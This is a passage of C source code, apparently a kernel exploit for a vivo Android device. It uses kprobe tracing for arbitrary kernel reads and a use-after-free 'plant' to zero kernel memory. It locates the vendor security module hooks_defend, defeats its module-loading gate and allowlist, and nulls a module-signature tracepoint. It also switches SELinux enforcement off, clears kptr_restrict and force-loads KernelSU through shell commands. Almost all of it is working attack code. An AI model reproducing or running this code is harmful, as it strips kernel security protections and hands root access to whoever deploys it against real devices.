			(void)syscall(SYS_init_module, NULL, 0, NULL);
		(void)wrf("/sys/kernel/tracing/instances/kr/tracing_on", "0");
		buf = malloc(cap);
		if (!buf)
			break;
		fd = open("/sys/kernel/tracing/instances/kr/trace", O_RDONLY | O_CLOEXEC);
		if (fd >= 0) {
			while (got < (ssize_t)cap - 1) {
				r = read(fd, buf + got, cap - 1 - (size_t)got);
				if (r <= 0)
					break;
				got += r;
			}
			close(fd);
		}
		if (got <= 0) {
			(void)wrf("/sys/kernel/tracing/instances/kr/buffer_size_kb", "8192");
			free(buf);
			buf = NULL;
			continue;
		}
		buf[got] = 0;
		/* own102: the parked parent's UAF plants need the big buffer back;
		 * a 64 KiB ring loses the 4096 timer-alloc records and every plant
		 * then fails with "victim not captured". */
		(void)wrf("/sys/kernel/tracing/instances/kr/buffer_size_kb", "8192");
		{
			char needle[40];
			char *p2 = buf;

			snprintf(needle, sizeof(needle), "%s:", ev);
			for (;;) {
				char *q = strstr(p2, needle);

				if (!q)
					break;
				found = (int)(q - buf);
				p2 = q + 1;
			}
		}
		if (found >= 0) {
			char line[4096];
			int i;

			snprintf(line, sizeof(line), "%s", buf + found);
			free(buf);
			buf = NULL;
			{
				char rm[48];

				snprintf(rm, sizeof(rm), "-:%s", ev);
				(void)wrf("/sys/kernel/tracing/kprobe_events", rm);
			}
			for (i = 0; i < n; i++) {
				char pat[16], *p2;

				snprintf(pat, sizeof(pat), "a%d=0x", i);
				p2 = strstr(line, pat);
				if (!p2) {
					out[i] = 0;
					continue;
				}
				out[i] = strtoull(p2 + strlen(pat), NULL, 16);
			}
			return 0;
		}
		free(buf);
		buf = NULL;
	}
	{
		char rm[48];

		snprintf(rm, sizeof(rm), "-:%s", ev);
		(void)wrf("/sys/kernel/tracing/kprobe_events", rm);
	}
	logf("[kread] %s not found after 6 tries\n", ev);
	return -1;
}

static int plant_req(uint64_t addr, int mode)
{
	int try_n;

	for (try_n = 0; try_n < 10; try_n++) {
		char ev[96], cmd[192], rm[110];
		int i;

		snprintf(ev, sizeof(ev), "req_%llx_%d_%d", (unsigned long long)addr,
			 mode, try_n);
		snprintf(cmd, sizeof(cmd), "p:%s capable", ev);
		if (wrf("/sys/kernel/tracing/kprobe_events", cmd)) {
			logf("[plant] req register failed errno=%d\n", errno);
			usleep(500000);
			continue;
		}
		sleep(6);
		for (i = 0; i < 6; i++) {
			uint64_t v = 1;

			if (!kread(&addr, 1, &v) && v == 0) {
				logf("[plant] %#llx mode=%d zeroed try=%d i=%d\n",
				     (unsigned long long)addr, mode, try_n, i);
				snprintf(rm, sizeof(rm), "-:%s", ev);
				(void)wrf("/sys/kernel/tracing/kprobe_events", rm);
				return 0;
			}
			usleep(1000000);
		}
		snprintf(rm, sizeof(rm), "-:%s", ev);
		(void)wrf("/sys/kernel/tracing/kprobe_events", rm);
		logf("[plant] %#llx mode=%d try=%d not zero, re-request\n",
		     (unsigned long long)addr, mode, try_n);
	}
	logf("[plant] %#llx mode=%d failed after retries\n",
	     (unsigned long long)addr, mode);
	return -1;
}

/* ================= own127: kernel-write route =================
 * BTF from the running kernel (vmlinux.btf):
 *   struct module        size 0x600: list@0x08 name@0x18 mem@0x1c0
 *   struct module_memory size 0x48 : base@0x00 size@0x08
 *   enum mod_mem_type: MOD_TEXT=0 MOD_DATA=1 MOD_RODATA=2 ...
 * hooks_defend's 13 sysfs attrs live in a 0x38-stride table inside its
 * MOD_DATA region.  Offline ko: .data starts at MOD_DATA+0xa88 (or +0xa90
 * when .init.data is also in MOD_DATA), insko_dfd_on entry is .data+0x1c0,
 * its write-once word (atomic set to 1 by the boot daemon) is entry+0x20.
 */
#define MODULES_HEAD_STATIC	0xffffffc0821ec498ULL
#define KIMAGE_STATIC		0xffffffc080000000ULL
#define KIMAGE_SPAN		0x04000000ULL
#define MOD_MEM_OFF		0x1c0ULL
#define MOD_MEM_ENT		0x48ULL
#define MOD_MEM_NUM		7

static int bsp_read(const char *name, char *out, size_t cap);
static int bsp_write(const char *name, const void *buf, size_t len);
static int insmod_via_allowlist(void);

static int mod_kptr(uint64_t v, uint64_t slide)
{
	uint64_t kb = KIMAGE_STATIC + slide;

	if (v < 0xffffff0000000000ULL)
		return 0;
	if (v >= kb && v < kb + KIMAGE_SPAN)
		return 0;
	return 1;
}

static uint32_t mod_rd32(const void *p)
{
	uint32_t v;

	memcpy(&v, p, 4);
	return v;
}

/* kread() refuses n > 8; split a refused batch in halves instead of losing it */
static int kread_any(uint64_t *addrs, int n, uint64_t *out)
{
	if (n <= 0)
		return 0;
	if (kread(addrs, n, out) == 0)
		return 0;
	if (n == 1)
		return -1;
	if (kread_any(addrs, n / 2, out))
		return -1;
	return kread_any(addrs + n / 2, n - n / 2, out + n / 2);
}

/* struct module.name is 56 bytes at mod+0x18 */
static void mod_name(char *dst, size_t n, uint64_t lo, uint64_t hi)
{
	unsigned char b[17];

	memcpy(b, &lo, 8);
	memcpy(b + 8, &hi, 8);
	b[16] = 0;
	snprintf(dst, n, "%s", (char *)b);
}

/* node is &mod->list (mod+8); fwd selects next vs prev */
static uint64_t mod_walk_dir(const char *want, uint64_t head, uint64_t start,
			     int fwd, int maxhop)
{
	uint64_t node = start;
	int i;

	for (i = 0; i < maxhop; i++) {
		uint64_t a[4], v[4];
		char nm[24];
		int try_n;

		a[0] = node;
		a[1] = node + 8;
		a[2] = node + 16;
		a[3] = node + 24;
		for (try_n = 0; try_n < 3; try_n++) {
			if (!kread_any(a, 4, v))
				break;
			logf("[mod] %s i=%d retry %d\n", fwd ? "fwd" : "bwd",
			     i, try_n);
			usleep(300000);
		}
		if (try_n == 3) {
			logf("[mod] %s i=%d node=%#llx read FAILED\n",
			     fwd ? "fwd" : "bwd", i, (unsigned long long)node);
			return 0;
		}
		mod_name(nm, sizeof(nm), v[2], v[3]);
		if ((i & 15) == 0)
			logf("[mod] %s i=%d %s uptime=%.1f\n",
			     fwd ? "fwd" : "bwd", i, nm, read_uptime());
		if (!strcmp(nm, want)) {
			logf("[mod] FOUND %s hop=%d dir=%s node=%#llx mod=%#llx\n",
			     want, i, fwd ? "fwd" : "bwd",
			     (unsigned long long)node,
			     (unsigned long long)(node - 8));
			return node - 8;
		}
		node = fwd ? v[0] : v[1];
		if (!node || node == head)
			break;
	}
	logf("[mod] %s walk: %s not found in %d hops\n", fwd ? "fwd" : "bwd",
	     want, i);
	return 0;
}

static int mods_index(const char *want)
{
	FILE *f = fopen("/proc/modules", "r");
	char line[256];
	size_t wl = strlen(want);
	int n = 0, idx = 0;

	if (!f) {
		logf("[mod] /proc/modules open failed errno=%d\n", errno);
		return 0;
	}
	while (fgets(line, sizeof(line), f)) {
		n++;
		if (!idx && !strncmp(line, want, wl) && line[wl] == ' ')
			idx = n;
	}
	fclose(f);
	g_mp_total = n;
	g_mp_idx = idx;
	return idx;
}

static uint64_t mod_find(const char *want, uint64_t slide, int hops_bwd,
			 int hops_fwd, int dir)
{
	uint64_t head = MODULES_HEAD_STATIC + slide;
	uint64_t ha[2], v[2] = { 0, 0 };
	uint64_t fwd, bwd, pa[4], pv[4];
	char nf[24] = "", nb[24] = "";
	uint64_t mod;

	ha[0] = head;
	ha[1] = head + 8;
	if (kread_any(ha, 2, v)) {
		logf("[mod] head %#llx read FAILED\n", (unsigned long long)head);
		return 0;
	}
	fwd = v[0];
	bwd = v[1];
	logf("[mod] head=%#llx next=%#llx prev=%#llx uptime=%.1f\n",
	     (unsigned long long)head, (unsigned long long)fwd,
	     (unsigned long long)bwd, read_uptime());
	if (!fwd || fwd == head) {
		logf("[mod] modules list EMPTY\n");
		return 0;
	}
	pa[0] = fwd + 16;
	pa[1] = fwd + 24;
	pa[2] = bwd + 16;
	pa[3] = bwd + 24;
	if (!kread_any(pa, 4, pv)) {
		mod_name(nf, sizeof(nf), pv[0], pv[1]);
		mod_name(nb, sizeof(nb), pv[2], pv[3]);
		logf("[mod] ends: next=%s prev=%s\n", nf, nb);
		if (!strcmp(nf, want))
			return fwd - 8;
		if (!strcmp(nb, want))
			return bwd - 8;
	}
	if (dir == 1) {
		mod = mod_walk_dir(want, head, fwd, 1, hops_fwd);
		if (!mod)
			mod = mod_walk_dir(want, head, bwd, 0, hops_bwd + 400);
	} else {
		mod = mod_walk_dir(want, head, bwd, 0, hops_bwd);
		if (!mod)
			mod = mod_walk_dir(want, head, fwd, 1, hops_fwd + 400);
	}
	return mod;
}

/* 50 consecutive reads of the modules list head must all succeed */
static int kread_selftest(uint64_t slide, int rounds)
{
	uint64_t head = MODULES_HEAD_STATIC + slide;
	int ok = 0, i;

	for (i = 0; i < rounds; i++) {
		uint64_t a[2] = { head, head + 8 };
		uint64_t v[2] = { 0, 0 };

		if (kread_any(a, 2, v) || !mod_kptr(v[0], slide) ||
		    !mod_kptr(v[1], slide)) {
			/* own128: hard reset of the trace ring, then one retry */
			(void)wrf("/sys/kernel/tracing/tracing_on", "0");
			(void)wrf("/sys/kernel/tracing/events/kprobes/enable", "0");
			(void)wrf("/sys/kernel/tracing/buffer_size_kb", "8192");
			usleep(50000);
			(void)wrf("/sys/kernel/tracing/buffer_size_kb", "64");
			usleep(20000);
			v[0] = v[1] = 0;
			if (!kread_any(a, 2, v) && mod_kptr(v[0], slide) &&
			    mod_kptr(v[1], slide))
				ok++;
			else
				logf("[kr] selftest round %d FAILED\n", i);
		} else
			ok++;
	}
	logf("[kr] selftest %d/%d ok uptime=%.1f\n", ok, rounds,
	     read_uptime());
	return ok;
}

/* read mem[MOD_DATA] out of struct module (BTF offsets) */
static int read_mod_mem(uint64_t mod, uint64_t slide, uint64_t *basep,
			uint32_t *sizep)
{
	uint64_t data_base = 0;
	uint32_t data_size = 0;
	int i;

	for (i = 0; i < MOD_MEM_NUM; i++) {
		uint64_t off = MOD_MEM_OFF + (uint64_t)i * MOD_MEM_ENT;
		uint64_t a[2], v[2] = { 0, 0 };

		a[0] = mod + off;
		a[1] = mod + off + 8;
		if (kread_any(a, 2, v)) {
			logf("[mem] type%d read FAILED\n", i);
			return -1;
		}
		logf("[mem] type%d base=%#llx size=%#x\n", i,
		     (unsigned long long)v[0], (uint32_t)v[1]);
		if (i == 1) {	/* MOD_DATA */
			data_base = v[0];
			data_size = (uint32_t)v[1];
		}
	}
	/* The struct module itself lives in MOD_DATA (.gnu.linkonce.this_module),
	 * so containment of mod is an exact, slide-independent sanity check.
	 * mod_kptr()'s vmlinux-image heuristic wrongly rejects module memory on
	 * this build (module_alloc memory sits inside base+64M here). */
	if (!data_base || !data_size || mod < data_base ||
	    mod >= data_base + (uint64_t)data_size) {
		logf("[mem] no usable MOD_DATA (mod=%#llx base=%#llx size=%#x)\n",
		     (unsigned long long)mod, (unsigned long long)data_base,
		     data_size);
		return -1;
	}
	*basep = data_base;
	*sizep = data_size;
	return 0;
}

/* entry layout: name@0 mode@8 show@0x10 store@0x18 flag@0x20 off@0x28 slot@0x30 */
static int attr_check(uint64_t entry, uint64_t slide, const char *want,
		      char *nm, size_t n, uint64_t *vals)
{
	uint64_t a[7], v[7] = { 0 };
	uint64_t sa[3], sv[3] = { 0 };
	int j;

	for (j = 0; j < 7; j++)
		a[j] = entry + (uint64_t)(j * 8);
	if (kread_any(a, 7, v))
		return -1;
	if (vals)
		for (j = 0; j < 7; j++)
			vals[j] = v[j];
	if ((v[1] & 0xffff) != 0x180)
		return -1;
	if (!mod_kptr(v[0], slide))
		return -1;
	sa[0] = v[0];
	sa[1] = v[0] + 8;
	sa[2] = v[0] + 16;
	if (kread_any(sa, 3, sv))
		return -1;
	memcpy(nm, sv, 24);
	nm[24] = 0;
	return strcmp(nm, want) ? -1 : 0;
}

static uint64_t find_attr_entry(uint64_t data, uint32_t size, uint64_t slide,
				const char *want)
{
	/* .data section offset inside MOD_DATA from the offline ko:
	 * 0xa88 without .init.data, 0xa90 with it; insko entry at +0x1c0. */
	static const uint32_t cands[] = { 0xa88 + 0x1c0, 0xa90 + 0x1c0,
					  0xa80 + 0x1c0, 0xa98 + 0x1c0 };
	char nm[32];
	uint64_t vals[7];
	size_t i;
	uint32_t off;

	for (i = 0; i < sizeof(cands) / sizeof(cands[0]); i++) {
		if (cands[i] + 0x38 > size)
			continue;
		if (attr_check(data + cands[i], slide, want, nm, sizeof(nm),
			       vals) == 0) {
			logf("[attr] %s at MOD_DATA+%#x name=%#llx mode=%#llx flag=%#llx off=%#llx slot=%#llx\n",
			     want, cands[i], (unsigned long long)vals[0],
			     (unsigned long long)vals[1],
			     (unsigned long long)vals[4],
			     (unsigned long long)vals[5],
			     (unsigned long long)vals[6]);
			return data + cands[i];
		}
	}
	logf("[attr] expected offsets missed; scanning MOD_DATA (%#x)\n",
	     size);
	if (size > 0x4000)
		size = 0x4000;
	/* read 64 bytes per round with a 0x38 overlap and look for the sysfs
	 * mode word 0x180; an entry starts 8 bytes before its mode word */
	for (off = 0; off + 0x40 <= size; off += 0x38) {
		uint64_t a[8], v[8] = { 0 };
		int j;

		for (j = 0; j < 8; j++)
			a[j] = data + off + (uint64_t)(j * 8);
		if (kread_any(a, 8, v))
			continue;
		for (j = 1; j < 8; j++) {
			uint64_t cand;

			if (v[j] != 0x180)
				continue;
			cand = data + off + (uint64_t)(j * 8) - 8;
			if (attr_check(cand, slide, want, nm, sizeof(nm),
				       vals) == 0) {
				logf("[attr] SCAN %s at %#llx (MOD_DATA+%#llx) flag=%#llx off=%#llx slot=%#llx\n",
				     want, (unsigned long long)cand,
				     (unsigned long long)(cand - data),
				     (unsigned long long)vals[4],
				     (unsigned long long)vals[5],
				     (unsigned long long)vals[6]);
				return cand;
			}
		}
	}
	return 0;
}

/* own127: find hooks_defend's .cs config struct.  init sets
 * .cs[0] = .cs[0x16c] = 0xdeadbeef, which makes it self-identifying. */
static uint64_t find_cs_base(uint64_t data, uint32_t size, uint64_t slide)
{
	uint64_t a[1], v[1] = { 0 };
	int i;

	for (i = 0; i < 2; i++) {
		uint64_t cand = data + (uint64_t)(i * 8);

		a[0] = cand;
		if (kread_any(a, 1, v) || (uint32_t)v[0] != 0xdeadbeef)
			continue;
		a[0] = cand + 0x16c;
		if (kread_any(a, 1, v) || (uint32_t)v[0] != 0xdeadbeef)
			continue;
		logf("[kw] .cs at MOD_DATA+%#x (both magics ok)\n", i * 8);
		return cand;
	}
	if (size > 0x4000)
		size = 0x4000;
	for (uint32_t off = 0; off + 0x170 <= size; off += 0x38) {
		uint64_t q[8], o[8] = { 0 };
		int j;

		for (j = 0; j < 8; j++)
			q[j] = data + off + (uint64_t)(j * 8);
		if (kread_any(q, 8, o))
			continue;
		for (j = 0; j < 8; j++) {
			uint64_t cand;

			if ((uint32_t)o[j] != 0xdeadbeef)
				continue;
			cand = data + off + (uint64_t)(j * 8);
			a[0] = cand + 0x16c;
			if (!kread_any(a, 1, v) &&
			    (uint32_t)v[0] == 0xdeadbeef) {
				logf("[kw] .cs SCAN at %#llx (MOD_DATA+%#llx)\n",
				     (unsigned long long)cand,
				     (unsigned long long)(cand - data));
				return cand;
			}
		}
	}
	return 0;
}

/* Kernel-write route: hooks_defend's khs_num/write_hash stores only require
 * g(7) = insko_dfd_on != 1.  g(i) = .cs[0x140 + perm[i]], perm is a per-boot
 * random permutation at .cs[0x14e..0x15b], so we read perm[7], then use the
 * parked parent's UAF plant to zero the aligned 8-byte block holding g(7).
 * That bypasses the write-once-sealed sysfs route entirely: no attribute
 * table lookup, no risky insko_dfd_on store. */
static int kernel_write_route(void)
{
	uint64_t slide = read_slide_file();
	uint64_t mod, data = 0, cs = 0, gaddr, word;
	uint32_t dsize = 0;
	unsigned char b24[24], p7;
	uint64_t a[3], v[3] = { 0, 0, 0 };
	int idx, hops_bwd, hops_fwd, dir;

	logf("[kw] start uptime=%.1f\n", read_uptime());
	if (!slide) {
		logf("[kw] no slide in ksu_slide.txt\n");
		return -1;
	}
	logf("[kw] slide=%#llx\n", (unsigned long long)slide);
	if (kread_selftest(slide, 50) < 45) {
		logf("[kw] kread unreliable, not walking\n");
		return -1;
	}
	idx = mods_index("hooks_defend");
	if (!idx) {
		logf("[kw] hooks_defend not in /proc/modules (%d modules)\n",
		     g_mp_total);
		return -1;
	}
	hops_bwd = g_mp_total - idx + 60;
	hops_fwd = idx - 1 + 60;
	dir = (idx - 1 <= g_mp_total - idx) ? 1 : 0;
	logf("[kw] /proc/modules idx=%d/%d dir=%s fwd=%d bwd=%d\n", idx,
	     g_mp_total, dir ? "fwd" : "bwd", hops_fwd, hops_bwd);
	mod = mod_find("hooks_defend", slide, hops_bwd, hops_fwd, dir);
	if (!mod) {
		logf("[kw] module walk failed\n");
		return -1;
	}
	if (read_mod_mem(mod, slide, &data, &dsize)) {
		logf("[kw] MOD_DATA read failed\n");
		return -1;
	}
	logf("[kw] hooks_defend mod=%#llx MOD_DATA=%#llx size=%#x uptime=%.1f\n",
	     (unsigned long long)mod, (unsigned long long)data, dsize,
	     read_uptime());
	cs = find_cs_base(data, dsize, slide);
	if (!cs) {
		logf("[kw] .cs magic not found in MOD_DATA\n");
		return -1;
	}
	a[0] = cs + 0x148;
	a[1] = cs + 0x150;
	a[2] = cs + 0x158;
	if (kread_any(a, 3, v)) {
		logf("[kw] perm array read failed\n");
		return -1;
	}
	memcpy(b24, &v[0], 8);
	memcpy(b24 + 8, &v[1], 8);
	memcpy(b24 + 16, &v[2], 8);
	p7 = b24[0x155 - 0x148];
	logf("[kw] perm[7]=%u perm[0..9]=%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x\n",
	     p7, b24[0x14e - 0x148], b24[0x14f - 0x148], b24[0x150 - 0x148],
	     b24[0x151 - 0x148], b24[0x152 - 0x148], b24[0x153 - 0x148],
	     b24[0x154 - 0x148], b24[0x155 - 0x148], b24[0x156 - 0x148],
	     b24[0x157 - 0x148]);
	if (p7 > 0xd) {
		logf("[kw] perm[7] invalid, .cs suspect\n");
		return -1;
	}
	gaddr = cs + 0x140 + p7;
	a[0] = gaddr;
	if (!kread_any(a, 1, v))
		logf("[kw] g(7) at %#llx = %#llx uptime=%.1f\n",
		     (unsigned long long)gaddr, (unsigned long long)v[0],
		     read_uptime());
	word = gaddr & ~7ULL;
	logf("[kw] planting zero at aligned word %#llx (covers g(7))\n",
	     (unsigned long long)word);
	if (plant_req(word, MODE_ZERO)) {
		logf("[kw] plant zero at %#llx FAILED\n",
		     (unsigned long long)word);
		return -1;
	}
	a[0] = word;
	v[0] = 1;
	if (kread_any(a, 1, v) || v[0] != 0) {
		logf("[kw] g block still %#llx after plant\n",
		     (unsigned long long)v[0]);
		return -1;
	}
	logf("[kw] g(7) cleared uptime=%.1f\n", read_uptime());
	{
		char sb[64];

		if (bsp_read("insko_dfd_on", sb, sizeof(sb)) == 0)
			logf("[kw] insko_dfd_on show='%s'\n", sb);
	}
	return insmod_via_allowlist();
}

static int path_in_kernel_image(uint64_t p, uint64_t base)
{
	return p >= base && p < base + 0x3000000;
}

static int module_loaded(void)
{
	FILE *f = fopen("/proc/modules", "r");
	char line[256];
	int found = 0;

	if (f) {
		while (fgets(line, sizeof(line), f))
			if (strstr(line, "kernelsu"))
				found = 1;
		fclose(f);
	}
	return found;
}

static void dump_kmsg_new(int fd0, const char *tag)
{
	static char kb[32768];
	static char hx[8193];
	size_t used = 0, i;
	ssize_t m;
	int fd = fd0;

	if (fd < 0)
		fd = open("/dev/kmsg", O_RDONLY | O_NONBLOCK | O_CLOEXEC);
	if (fd < 0)
		return;
	while ((m = read(fd, kb + used, sizeof(kb) - 1 - used)) > 0) {
		used += (size_t)m;
		if (used > sizeof(kb) - 256)
			break;
	}
	for (i = 0; i < used && i * 2 + 2 < sizeof(hx); i++)
		sprintf(hx + i * 2, "%02x", (unsigned char)kb[i]);
	hx[used * 2] = 0;
	logf("[%s] kmsg bytes=%zu hex=%s\n", tag, used, hx);
}

/* Every manager's ksud late-load funnels into the same kernel load_module
 * path, so this both tests the vendor gate and picks whoever matches the
 * installed manager (its own embedded kernelsu.ko + uapi version). */
static int run_manager_chain(void)
{
	static const struct {
		const char *ksud;
		const char *pkg;
	} mgrs[] = {
		{ "/data/app/~~grtAxPsNnKDs2msmyXt1JA==/me.weishu.kernelsu-UuVxqAXLqm_-h0jTYltSIA==/lib/arm64/libksud.so", "me.weishu.kernelsu" },
		{ "/data/app/~~8N7KuPeQyyS2MajOnfzySg==/me.inkdye.vivoksu-W42N-JHaH4YdnnDQzjrqxQ==/lib/arm64/libksud.so", "me.inkdye.vivoksu" },
		{ "/data/app/~~YI_0oMxlMo_tnzdcq_XFfA==/com.sakisu.sakisu-vg4LGWd3_1n4XFBJ6zup9A==/lib/arm64/libksud.so", "com.sakisu.sakisu" },
		{ "/data/local/tmp/ksud", "" },
	};
	size_t i;
	int kf;

	for (i = 0; i < sizeof(mgrs) / sizeof(mgrs[0]); i++) {
		char cmd[1400];
		struct stat st;
		int ef;

		if (stat(mgrs[i].ksud, &st)) {
			logf("[mgr] %s missing\n", mgrs[i].ksud);
			continue;
		}
		ef = open("/sys/fs/selinux/enforce", O_WRONLY | O_CLOEXEC);
		if (ef >= 0) {
			(void)write(ef, "0", 1);
			close(ef);
		}
		(void)wrf("/proc/sys/kernel/kptr_restrict", "0");
		kf = open("/dev/kmsg", O_RDONLY | O_NONBLOCK | O_CLOEXEC);
		if (kf >= 0)
			(void)lseek(kf, 0, SEEK_END);
		if (mgrs[i].pkg[0])
			snprintf(cmd, sizeof(cmd),
				 "/system/bin/sh -c '\"%s\" late-load --kmi android15-6.6 --allow-shell --package-name %s >> /data/local/tmp/mgr.out 2>&1'",
				 mgrs[i].ksud, mgrs[i].pkg);
		else
			snprintf(cmd, sizeof(cmd),
				 "/system/bin/sh -c '\"%s\" late-load --kmi android15-6.6 --allow-shell >> /data/local/tmp/mgr.out 2>&1'",
				 mgrs[i].ksud);
		logf("[mgr] try %s\n", mgrs[i].ksud);
		{
			pid_t mp = fork();

			if (mp == 0) {
				char *av[4];

				av[0] = (char *)"sh";
				av[1] = (char *)"-c";
				av[2] = cmd;
				av[3] = NULL;
				execv("/system/bin/sh", av);
				_exit(127);
			}
			if (mp > 0) {
				int st2 = 0;

				if (waitpid(mp, &st2, 0) == mp)
					logf("[mgr] sh rc=%#x\n", st2);
			}
		}
		sleep(3);
		dump_kmsg_new(kf, "mgr");
		if (kf >= 0)
			close(kf);
		if (module_loaded()) {
			logf("[mgr] LOADED via %s\n", mgrs[i].ksud);
			return 0;
		}
		logf("[mgr] no module after %s\n", mgrs[i].ksud);
	}
	return -1;
}

/* own110: the forum pointer - vendor tracepoint callback tables. Read the
 * funcs pointer of the module-sign / setid / task-tags tracepoints and null
 * the module-sign one (traceiter NULL-checks funcs, same trick as vr sys_exit). */
static void hks_probe(uint64_t slide)
{
	static const struct {
		const char *tag;
		uint64_t tp;
	} tps[] = {
		{ "rvh_module_sign", 0xffffffc08230a5f0ULL },
		{ "vh_audit_setid", 0xffffffc08230a500ULL },
		{ "rvh_check_task_tags", 0xffffffc08230a7d0ULL },
		{ "rvh_get_task_tags", 0xffffffc08230a730ULL },
	};
	size_t i;

	for (i = 0; i < sizeof(tps) / sizeof(tps[0]); i++) {
		uint64_t fa = tps[i].tp + slide + 0x48;
		uint64_t funcs = 0;

		if (kread(&fa, 1, &funcs)) {
			logf("[hks] %s read failed\n", tps[i].tag);
			continue;
		}
		logf("[hks] %s funcs=%#llx\n", tps[i].tag,
		     (unsigned long long)funcs);
		if (funcs) {
			uint64_t a2[2] = { funcs, funcs + 8 };
			uint64_t v2[2] = { 0, 0 };

			if (!kread(a2, 2, v2))
				logf("[hks] %s cb0=%#llx data0=%#llx\n",
				     tps[i].tag,
				     (unsigned long long)v2[0],
				     (unsigned long long)v2[1]);
		}
	}
	logf("[hks] zeroing rvh_module_sign funcs pointer\n");
	plant_req(0xffffffc08230a5f0ULL + slide + 0x48, 0);
}

/* own124: /sys/kernel/bsp_security/* is created by hooks_defend itself.  Its
 * store handlers write one byte into the module's obfuscated config array and
 * the load_module pre_handler derives its allow/deny verdict from a checksum
 * over those bytes: any single non-zero byte breaks the checksum, and the
 * "def_on" knob decides the fail path (0 -> allow, 1 -> follow the deny rule).
 * So writing def_on=0 then unlocked=1 should open the gate with no kernel
 * memory write at all.  Readback goes through the same array, so it also
 * verifies that the store really landed. */
static void sysfs_probe_attr(const char *path)
{
	char rb[32] = "";
	int rf = open(path, O_RDONLY | O_CLOEXEC);

	if (rf < 0) {
		logf("[sysfs] %s open-ro errno=%d\n", path, errno);
		return;
	}
	if (read(rf, rb, sizeof(rb) - 1) > 0) {
		size_t n = strlen(rb);

		while (n && (rb[n - 1] == '\n' || rb[n - 1] == '\r'))
			rb[--n] = 0;
		logf("[sysfs] %s = '%s'\n", path, rb);
	} else {
		logf("[sysfs] %s read errno=%d\n", path, errno);
	}
	close(rf);
}

static void sysfs_bsp_unlock(void)
{
	static const struct {
		const char *path;
		const char *val;
	} knobs[] = {
		{ "/sys/kernel/bsp_security/def_on", "0" },
		{ "/sys/kernel/bsp_security/unlocked", "1" },
		{ "/sys/kernel/bsp_security/compile_mode", "1" },
		{ "/sys/kernel/bsp_security/rem_authed", "1" },
		{ "/sys/kernel/bsp_security/em_authed", "1" },
		{ "/sys/kernel/bsp_security/vroot_authed", "1" },
	};
	size_t i;

	for (i = 0; i < sizeof(knobs) / sizeof(knobs[0]); i++) {
		int fd = open(knobs[i].path, O_WRONLY | O_CLOEXEC);
		ssize_t n;
		int e;

		if (fd < 0) {
			logf("[sysfs] open %s failed errno=%d\n", knobs[i].path,
			     errno);
			continue;
		}
		errno = 0;
		n = write(fd, knobs[i].val, 1);
		e = errno;
		close(fd);
		logf("[sysfs] %s <= '%s' write=%zd errno=%d\n", knobs[i].path,
		     knobs[i].val, n, n == 1 ? 0 : e);
	}
}

/* ================= own125: corrected hks gate =================
 *
 * Offline analysis of dev/cpio_vb30/hooks_defend.ko (build g64697b1fe5e3,
 * same source as running g3b723d0e8507):
 *
 * - The 13 /sys/kernel/bsp_security attrs belong to hooks_defend itself.
 *   The generic store (.text+0xa4) first checks the two .cs magics
 *   (both set to 0xdeadbeef by init_module, so that check always passes)
 *   and then a per-attribute write-once CAS word at attr+0x20: a second
 *   write returns -1/EPERM.  vivo's boot daemon has already written
 *   rem_authed/em_authed/vroot_authed/unlocked/compile_mode once, so those
 *   stores are permanently EPERM for us.  def_on uses the custom store at
 *   .text+0x484 (0/1 only, no CAS) and stays writable.
 *
 * - The load_module pre_handler (.text+0x1e90) allows only if:
 *     1) .cs[0] and .cs[0x16c] == 0xdeadbeef       (init sets them)
 *     2) the 24-byte key copy at .cs+0x10/0x20/0x30 matches the buffer
 *        pointed to by .cs+8                       (init generated)
 *     3) checksum != 0, where checksum =
 *            sum(g0..g4)&0xff == 0 ? g(8) : (def_on==1 ? g(8) : 1)
 *     g(8) is only written by vusb_msg, which needs a vivo RSA-signed
 *     message, so that branch cannot be forced from root.  g(9)=def_on=0.
 *     4) otherwise SHA256(image)[0..7] must be in the sorted allowlist
 *        struct at *_.data._ka (magic 0xcafebabe).
 *
 * - That allowlist can be rebuilt from root through khs_num + write_hash
 *   (both plain kobj_attributes with no write-once word).  khs_num=N
 *   allocates an N-entry u64 array; write_hash appends len/8 u64 values
 *   (len % 8 == 0) and publishes the new _ka when the array fills.  Both
 *   stores require g(7)=insko_dfd_on != 1.
 *
 * - init_module hashes exactly the buffer we hand it, so we hash our own
 *   slide-bound image instead of the on-disk file.
 */

/* ---- compact SHA-256 (used for the allowlist key) ---- */
typedef struct {
	uint32_t h[8];
	uint64_t bits;
	unsigned char buf[64];
	size_t n;
} sha256_ctx;

#define ROR32(x, n) (((x) >> (n)) | ((x) << (32 - (n))))

static const uint32_t sha256_k[64] = {
	0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5,
	0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
	0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3,
	0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
	0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc,
	0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
	0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7,
	0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
	0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13,
	0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
	0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3,
	0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
	0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5,
	0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
	0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208,
	0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2,
};

static void sha256_block(sha256_ctx *c, const unsigned char *p)
{
	uint32_t w[64];
	uint32_t a, b, d, e, f, g, h, t1, t2, cc;
	int i;

	for (i = 0; i < 16; i++)
		w[i] = ((uint32_t)p[i * 4] << 24) |
		       ((uint32_t)p[i * 4 + 1] << 16) |
		       ((uint32_t)p[i * 4 + 2] << 8) |
		       (uint32_t)p[i * 4 + 3];
	for (i = 16; i < 64; i++) {
		uint32_t s0 = ROR32(w[i - 15], 7) ^ ROR32(w[i - 15], 18) ^
			      (w[i - 15] >> 3);
		uint32_t s1 = ROR32(w[i - 2], 17) ^ ROR32(w[i - 2], 19) ^
			      (w[i - 2] >> 10);

		w[i] = w[i - 16] + s0 + w[i - 7] + s1;
	}
	a = c->h[0];
	b = c->h[1];
	cc = c->h[2];
	d = c->h[3];
